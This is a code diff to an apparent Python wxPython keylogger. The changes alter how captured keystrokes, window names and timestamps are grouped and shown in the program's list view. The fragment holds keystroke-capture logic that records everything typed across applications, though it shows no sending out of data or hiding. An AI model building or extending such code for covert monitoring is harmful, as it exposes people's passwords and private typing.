@@ -25,6 +25,8 @@ asciistr = ''
 keystr = ''
 keytime = ''
 
+changewindow = True
+
 class TaskBarIcon(wx.TaskBarIcon):
     ID_BAR_ABOUT = wx.NewId()
     ID_BAR_MAXSHOW = wx.NewId()
@@ -175,12 +177,18 @@ class Keylogger(wx.Frame):
         event.Skip()
 
     def updateDisplay(self, msg):
+        global changewindow
         data = msg.data
         if data:
-            index = self.list.InsertStringItem(sys.maxint, data[0])
-            self.list.SetStringItem(index, 1, data[1])
-            self.list.SetStringItem(index, 2, data[2])
-            self.list.SetStringItem(index, 3, data[3])
+            if changewindow == False:
+                index = self.list.GetItemCount()
+                self.list.SetStringItem(index-1, 2, data[2])
+                self.list.SetStringItem(index-1, 3, data[3])
+            else:
+                index = self.list.InsertStringItem(sys.maxint, data[0])
+                self.list.SetStringItem(index, 1, data[1])
+                self.list.SetStringItem(index, 2, data[2])
+                self.list.SetStringItem(index, 3, data[3])
 
     def ToggleStatusBar(self, e):
         if self.shst.IsChecked():
@@ -220,18 +228,20 @@ class Keylogger(wx.Frame):
         self.keyTrack.destroy()
 
 def onKeyboardEvent(event):
-    global appname, asciistr, keystr, keytime
+    global appname, asciistr, keystr, keytime, changewindow
     if appname == str(event.WindowName):
+        changewindow = False
         asciistr = asciistr + chr(event.Ascii)
         keystr = keystr + str(event.Key)
+        wx.CallAfter(Publisher().sendMessage, "update", (keytime, appname, asciistr, keystr))
     else:
-        if asciistr != '' or keystr != '':
-            wx.CallAfter(Publisher().sendMessage, "update", (keytime, appname, asciistr, keystr))
-            keyrecord.append((keytime, appname, asciistr, keystr))
+        changewindow = True
         appname = str(event.WindowName)
         asciistr = chr(event.Ascii)
         keystr = str(event.Key)
         keytime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+        wx.CallAfter(Publisher().sendMessage, "update", (keytime, appname, asciistr, keystr))
+        keyrecord.append((keytime, appname, asciistr, keystr))
     return True
 
 def main():
